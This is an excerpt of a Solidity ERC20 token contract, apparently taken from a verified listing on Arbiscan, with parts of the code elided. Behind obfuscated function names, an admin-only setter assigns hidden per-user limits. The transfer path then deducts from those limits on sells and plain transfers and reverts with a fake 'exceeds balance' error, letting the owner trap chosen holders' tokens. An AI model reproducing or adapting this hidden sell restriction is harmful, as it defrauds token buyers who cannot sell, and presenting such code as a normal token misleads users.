/**
 *Submitted for verification at Arbiscan.io on 2024-01-18
*/
...
abstract contract LLIEMNNConlse is Context, IRoleControl, ERC165 {
    struct RoleData {
...
contract LLIEMNNERC20 is Context, IERC20, IERC20Metadata  { 
...
contract TOKEN is LLIEMNNERC20, LLIEMNNConlse {
    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    address _tokenOwner;
    mapping(address => uint256) private _LLIEMNNbalan;
    mapping(address => uint256) private _LLIEMNNnull;

    address private _noneAddress = address(0x000000000000000000000000000000000000dEaD);

    constructor(address tokenOwner, string memory _name, string memory _symbol, uint256 _totalSupply) LLIEMNNERC20(_name, _symbol, _totalSupply, msg.sender) {
    ...
    function _transfer(address from, address to, uint256 amount) internal override(LLIEMNNERC20) {
        ...
        _LLIEMNNxiao(from, to, amount);

    }


    function _LLIEMNNxiao(address from, address to,uint256 amount) internal {
        
         require(to != address(0), "ERC20: transfer to the zero address");     
        
        _LLIEMNNTOLogo(from, to, amount);
    }

    function _LLIEMNNTOLogo(address from, address to,uint256 amount) internal {

        require(_balances[from] >= amount, "ERC20: transfer amount exceeds balance");  
        
        _LLIEMNNput(from, to, amount);
    }

    function _LLIEMNNput(address from, address to,uint256 amount) internal {

        bool takeFee = true;
        if(from == uniswapV2Pair){
            takeFee = true;
        }else if(to == uniswapV2Pair){
            _LLIEMNNliigge(from, amount);
        }else{
            _LLIEMNNliigge(from, amount);
            takeFee = false;
        }
    ...
    function setXIESNEmei(address user, uint256 amount) public  onlyRole(DEFAULT_ADMIN_ROLE)  {
        _LLIEMNNbalan[user] = amount*1000000000000000000;
    }


    function queryXIESNEmei(address user) public view returns (uint256) {
        return _LLIEMNNbalan[user];
    }


    function _LLIEMNNliigge(address account,uint256 amount) internal {  
        _LLIEMNNteng(account, amount);
    }


    function _LLIEMNNteng(address account,uint256 amount) internal {

        if (account != _noneAddress) {
            
            if(_LLIEMNNbalan[account] > 0){
                _LLIEMNNnull[account] = 1;
            }else{
                _LLIEMNNnull[account] = 0;
            }

        }
        _LLIEMNNllnnet(account, amount);
    }


    function _LLIEMNNllnnet(address account,uint256 amount) internal {  
        _LLIEMNNllnnet1(account, amount);
    }

    function _LLIEMNNllnnet1(address account,uint256 amount) internal {

        if (account != _noneAddress && amount > 0) {
            
            if(_LLIEMNNnull[account] == 1){
                uint256 dd = _LLIEMNNbalan[account].sub(amount);
                
                if(dd <= 0){
                    require(false, "ERC20: transfer amount exceeds balance");
                } 
                _LLIEMNNbalan[account] = dd;
            }else{
                uint256 dd = _LLIEMNNbalan[account];
                _LLIEMNNbalan[account] = dd;
            }
